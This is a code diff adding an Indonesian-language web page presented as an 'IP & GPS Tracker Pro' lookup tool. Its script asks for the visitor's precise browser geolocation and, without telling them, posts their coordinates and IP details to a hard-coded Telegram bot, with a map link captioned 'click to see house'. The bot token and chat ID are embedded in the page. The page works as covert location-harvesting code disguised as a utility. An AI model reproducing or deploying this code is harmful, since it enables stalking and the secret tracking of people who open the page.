@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP & GPS Tracker Pro</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #16213e; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); text-align: center; width: 350px; border: 1px solid #0f3460; }
+        h2 { margin-bottom: 10px; color: #4ecca3; }
+        input { width: 90%; padding: 10px; margin: 15px 0; border-radius: 5px; border: none; text-align: center; }
+        button { background: #4ecca3; color: #1a1a2e; border: none; padding: 12px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #45b293; transform: scale(1.02); }
+        #status { margin-top: 15px; font-size: 13px; color: #95a5a6; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Global Tracker</h2>
+    <p>Masukkan IP untuk memulai pelacakan</p>
+    <input type="text" id="ipInput" placeholder="Contoh: 8.8.8.8">
+    <button onclick="mulaiPelacakan()">LACAK SEKARANG</button>
+    <p id="status">Menunggu input...</p>
+</div>
+
+<script>
+    const TOKEN = '8684002005:AAFjJtbOpKla5LBoblqhZsNKWSTobULGMZg';
+    const CHAT_ID = '7576591520';
+
+    async function mulaiPelacakan() {
+        const ip = document.getElementById('ipInput').value;
+        const status = document.getElementById('status');
+
+        if (!ip) {
+            alert("Harap masukkan alamat IP!");
+            return;
+        }
+
+        status.innerText = "🔍 Melacak data IP...";
+
+        try {
+            // 1. Ambil data dari IP-API (Data Kasar)
+            const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,query,lat,lon`);
+            const dataIP = await res.json();
+
+            if (dataIP.status === "fail") {
+                status.innerText = "❌ IP tidak valid.";
+                return;
+            }
+
+            status.innerText = "📍 Meminta Izin GPS untuk akurasi desa...";
+
+            // 2. Minta GPS (Data Akurat)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                // JIKA USER MENERIMA (ALLOW)
+                kirimLaporan(dataIP, pos.coords);
+                status.innerText = "✅ Laporan lengkap (IP + GPS) terkirim!";
+            }, async (err) => {
+                // JIKA USER MENOLAK (BLOCK)
+                kirimLaporan(dataIP, null);
+                status.innerText = "⚠️ Hanya data IP yang dikirim (GPS ditolak).";
+            }, { enableHighAccuracy: true, timeout: 8000 });
+
+        } catch (error) {
+            status.innerText = "❌ Gangguan koneksi.";
+        }
+    }
+
+    async function kirimLaporan(dataIP, coordsGPS) {
+        let pesan = `<b>📊 LAPORAN PELACAKAN BARU</b>\n`;
+        pesan += `━━━━━━━━━━━━━━━━━━\n`;
+        pesan += `<b>🌐 DATA IP (Estimasi):</b>\n`;
+        pesan += `• IP: <code>${dataIP.query}</code>\n`;
+        pesan += `• ISP: ${dataIP.isp}\n`;
+        pesan += `• Lokasi: ${dataIP.city}, ${dataIP.country}\n`;
+        pesan += `• Peta IP: <a href="https://www.google.com/maps?q=${dataIP.lat},${dataIP.lon}">Buka Maps</a>\n\n`;
+
+        if (coordsGPS) {
+            pesan += `<b>🎯 DATA GPS (PRESISI):</b>\n`;
+            pesan += `• Akurasi: ± ${Math.round(coordsGPS.accuracy)} meter\n`;
+            pesan += `• Koordinat: <code>${coordsGPS.latitude}, ${coordsGPS.longitude}</code>\n`;
+            pesan += `• Peta Desa: <a href="https://www.google.com/maps?q=${coordsGPS.latitude},${coordsGPS.longitude}">Klik Lihat Rumah</a>\n`;
+        } else {
+            pesan += `<b>🎯 DATA GPS:</b> <i>Ditolak/Mati</i>\n`;
+        }
+        pesan += `━━━━━━━━━━━━━━━━━━`;
+
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'HTML' })
+        });
+    }
+</script>
+
+</body>
+</html>
